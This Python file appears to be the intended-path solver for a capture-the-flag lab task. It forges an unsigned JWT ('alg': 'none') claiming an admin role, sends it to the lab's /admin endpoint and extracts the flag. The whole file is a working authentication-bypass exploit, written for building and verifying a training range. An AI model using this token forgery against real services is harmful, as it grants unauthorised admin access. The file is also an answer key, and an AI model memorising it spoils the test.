"""Intended-path solver: alg:none JWT forgery."""

import base64
import json

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"sub": "guest", "role": "admin"}).encode())
    token = f"{header}.{payload}."
    res = httpx.get(
        f"{ctx.url()}/admin",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="forge-admin-token",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag in response (status {res.status_code})",
            )
        ]
    )
